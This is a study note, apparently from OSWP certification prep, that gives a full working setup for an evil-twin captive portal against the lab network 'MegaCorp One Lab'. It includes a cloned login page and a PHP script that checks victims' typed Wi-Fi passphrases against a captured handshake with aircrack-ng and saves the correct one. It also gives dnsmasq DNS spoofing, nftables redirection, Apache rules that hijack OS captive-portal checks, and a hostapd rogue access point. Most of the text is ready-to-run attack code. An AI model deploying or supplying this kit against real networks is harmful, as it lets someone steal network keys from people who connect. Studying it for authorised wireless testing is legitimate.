---
{"dg-publish":true,"permalink":"/oswp/h-captive-portals/"}
---

-----------
### Set up php portal:
1. Recursively download index page:
```
wget -r -l2 https://www.megacorpone.com
```
2. Create index page in /var/www/html/portal
```
<!DOCTYPE html>
<html lang="en">

	<head>
		<link href="assets/css/style.css" rel="stylesheet">
		<title>MegaCorp One - Nanotechnology Is the Future</title>
	</head>
	<body style="background-color:#000000;">
		<div class="navbar navbar-default navbar-fixed-top" role="navigation">
			<div class="container">
				<div class="navbar-header">
					<a class="navbar-brand" style="font-family: 'Raleway', sans-serif;font-weight: 900;" href="index.php">MegaCorp One</a>
				</div>
			</div>
		</div>

		<div id="headerwrap" class="old-bd">
			<div class="row centered">
				<div class="col-lg-8 col-lg-offset-2">
					<?php
						if (isset($_GET["success"])) {
							echo '<h3>Login successful</h3>';
							echo '<h3>You may close this page</h3>';
						} else {
							if (isset($_GET["failure"])) {
								echo '<h3>Invalid network key, try again</h3><br/><br/>';
							}
					?>
				<h3>Enter network key</h3><br/><br/>
				<form action="login_check.php" method="post">
					<input type="password" id="passphrase" name="passphrase"><br/><br/>
					<input type="submit" value="Connect"/>
				</form>
				<?php
						}
				?>
				</div>

				<div class="col-lg-4 col-lg-offset-4 himg ">
					<i class="fa fa-cog" aria-hidden="true"></i>
				</div>
			</div>
		</div>

	</body>
</html>
```
3. Move any assets from the downloaded folder to the portal directory.
4. Create login_check.php in the same dir and provide the path to the capture-file:
```
<?php
# Path of the handshake PCAP
$handshake_path = '/home/kali/discovery-01.cap';
# ESSID
$essid = 'MegaCorp One Lab';
# Path where a successful passphrase will be written
# Apache2's user must have write permissions
# For anything under /tmp, it's actually under a subdirectory
#  in /tmp due to Systemd PrivateTmp feature:
#  /tmp/systemd-private-$(uuid)-${service_name}-${hash}/$success_path
# See https://www.freedesktop.org/software/systemd/man/systemd.exec.html
$success_path = '/tmp/passphrase.txt';
# Passphrase entered by the user
$passphrase = $_POST['passphrase'];

# Make sure passphrase exists and
# is within passphrase lenght limits (8-63 chars)
if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
  header('Location: index.php?failure');
  die();
}

# Check if the correct passphrase has been found already ...
$correct_pass = file_get_contents($success_path);
if ($correct_pass !== FALSE) {

  # .. and if it matches the current one,
  # then redirect the client accordingly
  if ($correct_pass == $passphrase) {
    header('Location: index.php?success');
  } else {
    header('Location: index.php?failure');
  }
  die();
}

# Add passphrase to wordlist ...
$wordlist_path = tempnam('/tmp', 'wordlist');
$wordlist_file = fopen($wordlist_path, "w");
fwrite($wordlist_file, $passphrase);
fclose($wordlist_file);

# ... then crack the PCAP with it to see if it matches
# If ESSID contains single quotes, they need escaping
exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
" -w " . $wordlist_path . " " . $handshake_path, $output, $retval);

$key_found = FALSE;
# If the exit value is 0, aircrack-ng successfully ran
# We'll now have to inspect output and search for
# "KEY FOUND" to confirm the passphrase was correct
if ($retval == 0) {
	foreach($output as $line) {
		if (strpos($line, "KEY FOUND") !== FALSE) {
			$key_found = TRUE;
			break;
		}
	}
}

if ($key_found) {

  # Save the passphrase and redirect the user to the success page
  @rename($wordlist_path, $success_path);

  header('Location: index.php?success');
} else {
  # Delete temporary file and redirect user back to login page
  @unlink($wordlist_file);

  header('Location: index.php?failure');
}
?>
```
- As an alternative to using an existing handshake, we can also use a second wireless card with _wpa_supplicant_ to connect to the real AP. We would then use this to verify the credentials instead of cracking the handshake. If both target SSID and our rogue SSID match, we need to blacklist our BSSID in wpa_supplicant using "bssid_blacklist" so it doesn't try to connect back to us.

### Set up DHCP and DNS:
1. Assign an IP address to the wlan0 interface:
```
sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up
```
2. Configure conf for DHCP lease (add top-level domains for target):
```
# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
# since the DNS responses will be spoofed
listen-address=192.168.87.1

# DHCP range
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100

# This should cover most queries
# We can add 'log-queries' to log DNS queries
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1

# Entries for Windows 7 and 10 captive portal detection
address=/dns.msftncsi.com/131.107.255.255
```
3. Start dnsmasq with conf-file:
```
sudo dnsmasq --conf-file=<file>.conf
```
4. Confirm it is listening on port 53 (DNS) and 67 (DHCP):
```
sudo netstat -lnp
```
5. Set up nftables rules to force redirect DNS if DHCP provision is ignored:
```
sudo nft add table ip nat
sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```

### Final configs:
1. Modify /etc/apache2/sites-enabled/000-default.conf accordingly:
```
# Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT}
{ #CaptiveNetworkSupport}
(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]

</VirtualHost>
```
2. Enable redirect and alias module:
```
sudo a2enmod rewrite
sudo a2enmod alias
```
3. Start apache:
```
systemctl start apache2
```
4. Visit 127.0.0.1 and verify the captive portal is working.
5. If only Chrome is used it is recommended to add a HTTPS section because of encoding problems. Note: this will break Firefox because of self-signed certificate. To do that copy the "VirtualHost" section of  "/etc/apache2/sites-enabled/000-default.conf" and change port 80 to 443, and http to https, and add a SSL cert. See here:
```
<VirtualHost *:443>

  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT}
{ #CaptiveNetworkSupport}
(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 https://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt https://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt https://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L]

  # Use existing snakeoil certificates
  SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem
  SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
</VirtualHost>
```
6. Enable SSL module and restart apache:
```
sudo a2enmod ssl
sudo systemctl restart apache2
```
7. Create hostapd conf with SSID, channel and no encryption:
```
interface=wlan0
ssid=MegaCorp One Lab
channel=11

# 802.11n
hw_mode=g
ieee80211n=1

# Uncomment the following lines to use OWE instead of an open network
#wpa=2
#ieee80211w=2
#wpa_key_mgmt=OWE
#rsn_pairwise=CCMP
```
8. Run hostapd and the AP:
```
sudo hostapd <name>.conf
```
9. Monitor any DHCP and Apache logs for incoming connections:
```
sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
sudo tail -f /var/log/apache2/access.log
```
10. Check /tmp/passphrase.txt for passwords (win)!
11. Cleanup after hack, including killing the DHCP process with PID found in /var/run/dnsmasq.pid

### Weird captive portal behavior:
- Windows will not show the portal when automatically connecting, only when manually clicking connect.
- Chrome does not automatically check for captive portals on start-up, and only detects them when typing or doing a search.
